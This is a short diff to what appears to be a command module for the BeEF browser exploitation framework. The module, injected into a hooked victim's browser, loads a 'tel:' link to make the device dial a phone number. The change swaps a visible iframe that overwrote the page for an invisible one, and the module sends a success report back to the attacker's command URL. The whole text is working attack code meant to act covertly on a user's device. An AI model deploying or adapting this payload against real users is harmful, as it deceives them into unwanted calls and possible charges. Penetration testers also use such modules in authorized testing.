@@ -14,7 +14,8 @@
 //   limitations under the License.
 //
 beef.execute(function() {
-	document.body.innerHTML = "<iframe src=tel:<%= @tel_num %>></iframe>";
+	var sploit = beef.dom.createInvisibleIframe();
+	sploit.src = 'tel:<%= @tel_num %>';
 
     beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=IFrame Created!");
 });
